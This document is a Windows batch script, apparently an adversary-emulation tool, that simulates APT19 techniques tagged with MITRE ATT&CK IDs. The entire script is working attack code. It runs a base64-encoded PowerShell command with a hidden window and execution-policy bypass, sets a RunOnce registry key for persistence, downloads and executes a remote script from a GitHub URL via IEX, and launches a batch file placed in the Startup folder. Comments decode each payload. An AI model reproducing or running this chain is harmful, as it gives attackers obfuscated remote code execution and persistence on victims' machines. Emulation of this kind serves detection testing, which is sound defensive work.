@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Exection using PowerShell (T1086)
ECHO.
ECHO.
ECHO [+] Simulate Execution of Powershell obfuscated payload with Hidden Window, Registry/Startup Persistence, Data Collection and Encoding
ECHO [+] T1086	PowerShell
ECHO [+] T1027	Obfuscated Files or Information
ECHO [+] T1143	Hidden Window
ECHO [+] T1060	Registry Run Keys / Startup Folder
ECHO [+] T1064	Scripting
ECHO [+] T1082	System Information Discovery
ECHO [+] T1016	System Network Configuration Discovery
ECHO [+] T1033	System Owner/User Discovery
ECHO [+] T1132	Data Encoding
ECHO --------------------------------------------------------------------------------------------------------
powershell -enc UABvAHcAZQByAHMAaABlAGwAbAAgAC0AdwBpAG4AZABvAHcAcwB0AHkAbABlACAAaABpAGQAZABlAG4AIAAtAGUAcAAgAGIAeQBwAGEAcwBzACAASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4ATwBuAGMAZQA9ACcASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4ATwBuAGMAZQAnADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBwAGEAdABoACAASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4ATwBuAGMAZQAgAC0ATgBhAG0AZQAgACcATgBlAHgAdABSAHUAbgAnACAALQB2AGEAbAB1AGUAIAAnAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAGUAbgBjACAAVQBBAEIAdgBBAEgAYwBBAFoAUQBCAHkAQQBIAE0AQQBhAEEAQgBsAEEARwB3AEEAYgBBAEEAZwBBAEMAMABBAFoAUQBCAHcAQQBDAEEAQQBZAGcAQgA1AEEASABBAEEAWQBRAEIAegBBAEgATQBBAEkAQQBBAG8AQQBFADQAQQBaAFEAQgAzAEEAQwAwAEEAVAB3AEIAaQBBAEcAbwBBAFoAUQBCAGoAQQBIAFEAQQBJAEEAQgBPAEEARwBVAEEAZABBAEEAdQBBAEYAYwBBAFoAUQBCAGkAQQBFAE0AQQBiAEEAQgBwAEEARwBVAEEAYgBnAEIAMABBAEMAawBBAEwAZwBCAEUAQQBHADgAQQBkAHcAQgB1AEEARwB3AEEAYgB3AEIAaABBAEcAUQBBAFoAZwBCAHAAQQBHAHcAQQBaAFEAQQBvAEEAQwBJAEEAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEASABJAEEAWQBRAEIAMwBBAEMANABBAFoAdwBCAHAAQQBIAFEAQQBhAEEAQgAxAEEARwBJAEEAZABRAEIAegBBAEcAVQBBAGMAZwBCAGoAQQBHADgAQQBiAGcAQgAwAEEARwBVAEEAYgBnAEIAMABBAEMANABBAFkAdwBCAHYAQQBHADAAQQBMAHcAQgBuAEEASABJAEEAWgBRAEIANQBBAEcATQBBAFoAUQBCAHMAQQBDADgAQQBjAEEAQgB2AEEARwBNAEEATAB3AEIAdABBAEcARQBBAGMAdwBCADAAQQBHAFUAQQBjAGcAQQB2AEEARQBFAEEAVQBBAEIAVQBBAEQARQBBAE8AUQBCAGYAQQBGAE0AQQBlAFEAQgB6AEEARwBrAEEAYgBnAEIAbQBBAEcAOABBAEkAZwBBAHMAQQBDAEkAQQBRAHcAQQA2AEEARgB3AEEAVgBRAEIAegBBAEcAVQBBAGMAZwBCAHoAQQBGAHcAQQBSAHcAQgB5AEEARwBVAEEAZQBRAEIAYwBBAEUARQBBAGMAQQBCAHcAQQBFAFEAQQBZAFEAQgAwAEEARwBFAEEAWABBAEIAUwBBAEcAOABBAFkAUQBCAHQAQQBHAGsAQQBiAGcAQgBuAEEARgB3AEEAVABRAEIAcABBAEcATQBBAGMAZwBCAHYAQQBIAE0AQQBiAHcAQgBtAEEASABRAEEAWABBAEIAWABBAEcAawBBAGIAZwBCAGsAQQBHADgAQQBkAHcAQgB6AEEARgB3AEEAVQB3AEIAMABBAEcARQBBAGMAZwBCADAAQQBDAEEAQQBUAFEAQgBsAEEARwA0AEEAZABRAEIAYwBBAEYAQQBBAGMAZwBCAHYAQQBHAGMAQQBjAGcAQgBoAEEARwAwAEEAYwB3AEIAYwBBAEYATQBBAGQAQQBCAGgAQQBIAEkAQQBkAEEAQgAxAEEASABBAEEAWABBAEIAQgBBAEYAQQBBAFYAQQBBAHgAQQBEAGsAQQBYAHcAQgBUAEEASABRAEEAWQBRAEIAeQBBAEgAUQBBAGQAUQBCAHcAQQBDADQAQQBZAGcAQgBoAEEASABRAEEASQBnAEEAcABBAEEAPQA9ACcAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAIgBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGcAcgBlAHkAYwBlAGwALwBwAG8AYwAvAG0AYQBzAHQAZQByAC8AQQBQAFQAMQA5AF8AUwB0AGEAcgB0AHUAcAAiACkAOwAgAHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAEcAcgBlAHkAXABBAHAAcABEAGEAdABhAFwAUgBvAGEAbQBpAG4AZwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFMAdABhAHIAdAAgAE0AZQBuAHUAXABQAHIAbwBnAHIAYQBtAHMAXABTAHQAYQByAHQAdQBwAFwAQQBQAFQAMQA5AF8AUwB0AGEAcgB0AHUAcAAuAGIAYQB0ACIA
ECHO.
ECHO.
ECHO.
::Decoded-content: 
::------------------
::Powershell -windowstyle hidden -ep bypass $RunOnceKey='HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'; New-ItemProperty -path $RunOnceKey -Name 'NextRun' -value 'powershell -enc UABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBwACAAYgB5AHAAYQBzAHMAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAoACIAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBnAHIAZQB5AGMAZQBsAC8AcABvAGMALwBtAGEAcwB0AGUAcgAvAEEAUABUADEAOQBfAFMAeQBzAGkAbgBmAG8AIgAsACIAQwA6AFwAVQBzAGUAcgBzAFwARwByAGUAeQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAXABBAFAAVAAxADkAXwBTAHQAYQByAHQAdQBwAC4AYgBhAHQAIgApAA=='; IEX (New-Object Net.WebClient).Downloadstring(`"https://raw.githubusercontent.com/greycel/poc/master/APT19_Startup`"); start-process `"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\APT19_Startup.bat`""

::Decoded-content: 
::------------------
:: Powershell -ep bypass (New-Object Net.WebClient).Downloadfile(`"https://raw.githubusercontent.com/greycel/poc/master/APT19_Sysinfo`",`"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\APT19_Startup.bat`")"





